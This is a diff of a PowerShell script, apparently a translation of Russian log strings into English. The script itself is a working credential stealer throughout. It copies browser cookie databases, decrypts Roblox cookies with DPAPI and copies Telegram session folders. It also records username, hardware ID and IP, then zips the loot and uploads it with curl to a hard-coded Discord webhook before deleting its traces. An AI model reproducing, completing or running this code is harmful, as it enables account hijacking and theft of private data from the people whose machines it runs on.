@@ -1,28 +1,25 @@
 $webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"
 
-# ===== ОТЛАДКА =====
 $log = "$env:TEMP\zeta_debug.log"
 "=== ZETA DEBUG ===" | Out-File $log -Force
-"1. Скрипт запущен $(Get-Date)" | Out-File $log -Append
-Write-Host "1. Скрипт запущен" -ForegroundColor Cyan
+"1. Script started $(Get-Date)" | Out-File $log -Append
+Write-Host "1. Script started" -ForegroundColor Cyan
 
-# ===== ПАПКА =====
 $d = "$env:TEMP\Zeta_Cookies"
 try {
     md $d -Force | Out-Null
-    "2. Папка создана: $d" | Out-File $log -Append
-    Write-Host "2. Папка создана: $d" -ForegroundColor Green
+    "2. Folder created: $d" | Out-File $log -Append
+    Write-Host "2. Folder created: $d" -ForegroundColor Green
 } catch {
-    "❌ Ошибка создания папки: $_" | Out-File $log -Append
-    Write-Host "❌ Ошибка создания папки: $_" -ForegroundColor Red
-    Read-Host "Нажми Enter"
+    "ERROR: $_" | Out-File $log -Append
+    Write-Host "ERROR: $_" -ForegroundColor Red
+    Read-Host "Press Enter"
     exit
 }
 
-# ===== ПОИСК COOKIES =====
 $found = @()
 $searchPaths = @($env:APPDATA, $env:LOCALAPPDATA, (Join-Path $env:LOCALAPPDATA '..\LocalLow'))
-"3. Пути поиска: $searchPaths" | Out-File $log -Append
+"3. Search paths: $searchPaths" | Out-File $log -Append
 
 foreach ($base in $searchPaths) {
     try {
@@ -33,24 +30,23 @@ foreach ($base in $searchPaths) {
                 }
             if ($files) { 
                 $found += $files
-                "4. Найдено файлов: $($files.Count) в $base" | Out-File $log -Append
-                Write-Host "4. Найдено файлов: $($files.Count) в $base" -ForegroundColor Green
+                "4. Found $($files.Count) files in $base" | Out-File $log -Append
+                Write-Host "4. Found $($files.Count) files in $base" -ForegroundColor Green
             }
         }
     } catch {
-        "⚠️ Ошибка в пути $base : $_" | Out-File $log -Append
+        "ERROR in $base : $_" | Out-File $log -Append
     }
 }
 
-"5. Всего найдено файлов: $($found.Count)" | Out-File $log -Append
-Write-Host "5. Всего найдено файлов: $($found.Count)" -ForegroundColor Cyan
+"5. Total files found: $($found.Count)" | Out-File $log -Append
+Write-Host "5. Total files found: $($found.Count)" -ForegroundColor Cyan
 
 if ($found.Count -eq 0) {
-    "⚠️ НЕ НАЙДЕНО НИ ОДНОГО ФАЙЛА COOKIES!" | Out-File $log -Append
-    Write-Host "⚠️ НЕ НАЙДЕНО НИ ОДНОГО ФАЙЛА COOKIES!" -ForegroundColor Red
+    "NO COOKIES FOUND!" | Out-File $log -Append
+    Write-Host "NO COOKIES FOUND!" -ForegroundColor Red
 }
 
-# ===== КОПИРОВАНИЕ COOKIES =====
 $goldenKey = $null
 $goldenSeal = $null
 $filesCopied = 0
@@ -75,9 +71,8 @@ foreach ($f in $found) {
         $dest = Join-Path $d $name
         Copy-Item -Path $src -Destination $dest -Force -ErrorAction Stop 
         $filesCopied++
-        "6. Скопирован: $name" | Out-File $log -Append
+        "6. Copied: $name" | Out-File $log -Append
 
-        # Пробуем найти golden_key
         try {
             Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
             $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dest;Version=3;Read Only=True;")
@@ -88,29 +83,28 @@ foreach ($f in $found) {
             if ($result -and $result -ne $null) {
                 $goldenKey = $result
                 $goldenKey | Out-File "$d\golden_key.txt" -Force
-                "7. Найден golden_key в $name" | Out-File $log -Append
-                Write-Host "7. Найден golden_key" -ForegroundColor Green
+                "7. golden_key found in $name" | Out-File $log -Append
+                Write-Host "7. golden_key found" -ForegroundColor Green
             }
             $conn.Close()
         } catch {
-            # Молча скипаем
+            # skip
         }
-        
+
     } catch {
-        "⚠️ Ошибка копирования $($f.FullName) : $_" | Out-File $log -Append
-        Write-Host "⚠️ Ошибка копирования: $_" -ForegroundColor Red
+        "ERROR copying $($f.FullName) : $_" | Out-File $log -Append
+        Write-Host "ERROR copying: $_" -ForegroundColor Red
     }
 }
 
-"8. Скопировано файлов: $filesCopied" | Out-File $log -Append
-Write-Host "8. Скопировано файлов: $filesCopied" -ForegroundColor Cyan
+"8. Files copied: $filesCopied" | Out-File $log -Append
+Write-Host "8. Files copied: $filesCopied" -ForegroundColor Cyan
 
-# ===== ROBLOX =====
 try {
     $rob = $env:LOCALAPPDATA + '\Roblox\LocalStorage\RobloxCookies.dat'
     if (Test-Path $rob) {
         Copy-Item $rob "$d\RobloxCookies.dat" -Force -ErrorAction SilentlyContinue
-        "9. Roblox файл скопирован" | Out-File $log -Append
+        "9. Roblox file copied" | Out-File $log -Append
         try {
             $c = Get-Content $rob -Raw | ConvertFrom-Json -ErrorAction Stop
             if ($c -and $c.CookiesData) {
@@ -119,21 +113,20 @@ try {
                 $s = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser')
                 $t = [Text.Encoding]::UTF8.GetString($s)
                 $t | Out-File "$d\RobloxCookies_decrypted.txt" -ErrorAction SilentlyContinue
-                "10. Roblox расшифрован" | Out-File $log -Append
-                Write-Host "10. Roblox расшифрован" -ForegroundColor Green
+                "10. Roblox decrypted" | Out-File $log -Append
+                Write-Host "10. Roblox decrypted" -ForegroundColor Green
             }
         } catch {
-            "⚠️ Ошибка расшифровки Roblox: $_" | Out-File $log -Append
-            Write-Host "⚠️ Ошибка расшифровки Roblox: $_" -ForegroundColor Red
+            "ERROR Roblox decrypt: $_" | Out-File $log -Append
+            Write-Host "ERROR Roblox decrypt: $_" -ForegroundColor Red
         }
     } else {
-        "⚠️ Roblox файл не найден" | Out-File $log -Append
+        "Roblox file not found" | Out-File $log -Append
     }
 } catch {
-    "⚠️ Ошибка Roblox: $_" | Out-File $log -Append
+    "ERROR Roblox: $_" | Out-File $log -Append
 }
 
-# ===== TELEGRAM =====
 try {
     $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
     if (Test-Path $tgPath) {
@@ -143,16 +136,15 @@ try {
         if ((Get-ChildItem $tgDest -Recurse -File -ErrorAction SilentlyContinue).Count -eq 0) {
             Copy-Item -Path "$tgPath\*" -Destination $tgDest -Recurse -Force -ErrorAction SilentlyContinue
         }
-        "11. Telegram tdata скопирован" | Out-File $log -Append
-        Write-Host "11. Telegram tdata скопирован" -ForegroundColor Green
+        "11. Telegram tdata copied" | Out-File $log -Append
+        Write-Host "11. Telegram tdata copied" -ForegroundColor Green
     } else {
-        "⚠️ Telegram tdata не найден" | Out-File $log -Append
+        "Telegram tdata not found" | Out-File $log -Append
     }
 } catch {
-    "⚠️ Ошибка Telegram: $_" | Out-File $log -Append
+    "ERROR Telegram: $_" | Out-File $log -Append
 }
 
-# ===== ИНФО =====
 try {
     $u = $env:USERNAME
     try {
@@ -166,47 +158,44 @@ try {
         $i = "IP_NOT_FOUND"
     }
     "User: $u`nHWID: $h`nIP: $i" | Out-File "$d\info.txt" -ErrorAction SilentlyContinue
-    "12. Инфо о системе сохранена" | Out-File $log -Append
+    "12. System info saved" | Out-File $log -Append
 } catch {
-    "⚠️ Ошибка сбора инфо: $_" | Out-File $log -Append
+    "ERROR system info: $_" | Out-File $log -Append
 }
 
-# ===== АРХИВ =====
 try {
     $zip = "$env:TEMP\cookies.zip"
     if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
     Compress-Archive -Path $d -DestinationPath $zip -Force -ErrorAction SilentlyContinue
-    "13. Архив создан: $zip" | Out-File $log -Append
-    Write-Host "13. Архив создан" -ForegroundColor Green
+    "13. Archive created: $zip" | Out-File $log -Append
+    Write-Host "13. Archive created" -ForegroundColor Green
 } catch {
-    "❌ Ошибка архивации: $_" | Out-File $log -Append
-    Write-Host "❌ Ошибка архивации: $_" -ForegroundColor Red
+    "ERROR archive: $_" | Out-File $log -Append
+    Write-Host "ERROR archive: $_" -ForegroundColor Red
 }
 
-# ===== ОТПРАВКА =====
 try {
     if (Test-Path $zip) {
         curl.exe -F "file=@$zip" $webhook
-        "14. Отправлено через curl" | Out-File $log -Append
-        Write-Host "14. Отправлено через curl" -ForegroundColor Green
+        "14. Sent via curl" | Out-File $log -Append
+        Write-Host "14. Sent via curl" -ForegroundColor Green
     } else {
-        "❌ Архив не создался" | Out-File $log -Append
-        Write-Host "❌ Архив не создался" -ForegroundColor Red
+        "Archive not created" | Out-File $log -Append
+        Write-Host "Archive not created" -ForegroundColor Red
     }
 } catch {
-    "❌ Ошибка отправки: $_" | Out-File $log -Append
-    Write-Host "❌ Ошибка отправки: $_" -ForegroundColor Red
+    "ERROR sending: $_" | Out-File $log -Append
+    Write-Host "ERROR sending: $_" -ForegroundColor Red
 }
 
-# ===== ЧИСТКА =====
 try {
     Remove-Item $zip -Force -ErrorAction SilentlyContinue
     Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
-    "15. Чистка выполнена" | Out-File $log -Append
+    "15. Cleanup done" | Out-File $log -Append
 } catch {
-    "⚠️ Ошибка чистки: $_" | Out-File $log -Append
+    "ERROR cleanup: $_" | Out-File $log -Append
 }
 
-"16. Скрипт завершен $(Get-Date)" | Out-File $log -Append
-Write-Host "✅ Скрипт завершен! Лог: $log" -ForegroundColor Cyan
-Read-Host "Нажми Enter для выхода"
+"16. Script finished $(Get-Date)" | Out-File $log -Append
+Write-Host "Script finished! Log: $log" -ForegroundColor Cyan
+Read-Host "Press Enter to exit"
